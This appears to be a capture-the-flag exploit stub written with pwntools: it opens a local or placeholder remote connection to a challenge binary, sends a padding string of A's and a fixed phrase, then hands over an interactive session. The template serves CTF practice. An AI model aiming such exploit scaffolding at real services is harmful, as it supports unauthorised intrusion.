#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    r.recv()
    r.sendline("AAAAAAAAAAAAAAAAAAAAAAAAA+")
    r.send("make every program a filter\n")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
